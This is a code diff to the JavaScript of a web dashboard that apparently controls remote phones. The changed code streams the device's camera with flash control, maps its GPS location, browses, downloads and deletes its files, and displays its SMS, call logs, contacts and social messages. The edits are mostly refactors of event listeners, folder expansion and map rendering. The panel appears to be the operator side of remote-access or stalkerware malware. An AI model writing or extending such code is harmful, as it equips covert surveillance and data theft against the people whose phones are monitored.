@@ -1358,7 +1358,7 @@
         let socialMsgsData = [], currentLocation = null;
         let deviceInfoRefreshInterval = null;
         let currentMapType = 'street';
-        let liveMap = null, liveMarker = null, liveCircle = null, followLocation = false;
+        let liveMap = null, liveMarker = null, liveCircle = null, followLocation = false, fileTreeCache = {};
 
         const panel = document.getElementById('main-panel');
         const statusEl = document.getElementById('status');
@@ -1685,17 +1685,17 @@
                 }
             };
             document.getElementById('cameraFullscreenBtn').onclick = () => { if (video.requestFullscreen) video.requestFullscreen(); };
-            document.getElementById('cameraCloseBtn').onclick=()=>{ 
-    if(recorder&&recorder.state==='recording')recorder.stop(); 
-    if(stream)stream.getTracks().forEach(t=>t.stop()); 
-    modal.classList.remove('show'); 
-    document.body.classList.remove('modal-open'); 
-    if(cameraPC)cameraPC.close(); 
-    cameraPC=null;
-    // Send STOP_CAMERA signal to the device
-    sendSignaling({ type: 'STOP_CAMERA' });
-    sendCommand('FLASH_OFF');
-};
+            document.getElementById('cameraCloseBtn').onclick = () => {
+                if (recorder && recorder.state === 'recording') recorder.stop();
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                modal.classList.remove('show');
+                document.body.classList.remove('modal-open');
+                if (cameraPC) cameraPC.close();
+                cameraPC = null;
+                // Send STOP_CAMERA signal to the device
+                sendSignaling({ type: 'STOP_CAMERA' });
+                sendCommand('FLASH_OFF');
+            };
         }
         async function startLiveCamera() {
             const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
@@ -1800,20 +1800,16 @@
             }
             html += `</ul></div></div>`;
             panel.innerHTML = html;
-            attachFileEventListeners();
         }
-        function attachFileEventListeners() {
-            document.querySelectorAll('.folder-header').forEach(header => {
-                header.removeEventListener('click', folderClickHandler);
-                header.addEventListener('click', folderClickHandler);
+        function attachFileEventListeners(container = document) {
+            container.querySelectorAll('.folder-header').forEach(header => {
+                header.onclick = (e) => folderClickHandler(e);
             });
-            document.querySelectorAll('.file-action-btn.dl').forEach(btn => {
-                btn.removeEventListener('click', downloadClickHandler);
-                btn.addEventListener('click', downloadClickHandler);
+            container.querySelectorAll('.file-action-btn.dl').forEach(btn => {
+                btn.onclick = (e) => downloadClickHandler(e);
             });
-            document.querySelectorAll('.file-action-btn.del').forEach(btn => {
-                btn.removeEventListener('click', deleteClickHandler);
-                btn.addEventListener('click', deleteClickHandler);
+            container.querySelectorAll('.file-action-btn.del').forEach(btn => {
+                btn.onclick = (e) => deleteClickHandler(e);
             });
         }
         function folderClickHandler(e) {
@@ -1825,21 +1821,17 @@
             const inner = document.getElementById('tree-inner-' + encPath);
             const chevron = header.querySelector('.chevron');
             if (!container) return;
-            if (container.classList.contains('open')) {
-                // Collapse
-                container.classList.remove('open');
-                if (chevron) chevron.style.transform = '';
+            if (container.classList.contains('expanded')) {
+                container.classList.remove('expanded');
+                if (chevron) chevron.classList.remove('down');
             } else {
-                // Expand
-                container.classList.add('open');
-                if (chevron) chevron.style.transform = 'rotate(90deg)';
-                if (inner.innerHTML.trim() !== '' && !inner.querySelector('li[data-loading]')) {
-                    // Already populated — just show
-                } else {
+                container.classList.add('expanded');
+                if (chevron) chevron.classList.add('down');
+                if (inner.innerHTML.trim() === '' || inner.querySelector('li[data-loading]')) {
                     inner.innerHTML = '<li data-loading="1" style="padding:10px 20px; color:#999; font-size:12px;">⏳ Loading...</li>';
                     currentPath = path;
-                    sendCommand('LIST_FILES', { path: path });
                     window.pendingFolderLoad = { path, encPath, inner };
+                    sendCommand('LIST_FILES', { path: path });
                 }
             }
         }
@@ -2272,7 +2264,26 @@
                 if (followLocation) {
                     liveMap.setView([lat, lon]);
                 }
-            }
+        }
+        function renderMap(data) {
+            const loc = data && data.latitude ? { lat: data.latitude, lon: data.longitude, acc: data.accuracy || 10 } : (data && data.lat ? data : null);
+            if (!loc) return;
+            currentLocation = loc;
+            panel.innerHTML = `
+                <h3>📍 Device Location</h3>
+                <div id="gpsMap" style="height:450px; border-radius:12px; border:1px solid var(--border);"></div>
+                <div class="map-info" style="position:relative; top:12px; left:0; max-width:100%; box-shadow:none; border:1px solid var(--border);">
+                    <div><strong>📍 GPS Fix</strong></div>
+                    <div>Coordinates: ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
+                    <div>Accuracy: ${loc.acc.toFixed(1)}m</div>
+                </div>
+            `;
+            setTimeout(() => {
+                const map = L.map('gpsMap').setView([loc.lat, loc.lon], 16);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                L.marker([loc.lat, loc.lon]).addTo(map).bindPopup('Last Known Location').openPopup();
+                L.circle([loc.lat, loc.lon], { radius: loc.acc, color: '#0f62fe', fillColor: '#0f62fe', fillOpacity: 0.15 }).addTo(map);
+            }, 100);
         }
 
         // ==================== DATA DISPLAY FUNCTIONS (FIXED SMS, CALL LOGS, CONTACTS) ====================
@@ -2523,12 +2534,13 @@
                         const { path: fPath, inner: fInner } = window.pendingFolderLoad;
                         fileTreeCache[fPath] = _files;
                         fInner.innerHTML = renderFileTreeNodes(_files, fPath);
+                        attachFileEventListeners(fInner);
                         window.pendingFolderLoad = null;
-                        attachFileEventListeners();
                     } else {
-                        fileTreeCache[currentPath] = _files;
+                        fileTreeCache[currentPath || 'root'] = _files;
                         currentData = _files;
                         renderFiles();
+                        attachFileEventListeners(document.getElementById('tree-root-container'));
                     }
                 } catch (e) { console.error('FILE_LIST error:', e); } break;
                 case 'SMS_DATA': try { displaySMS(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
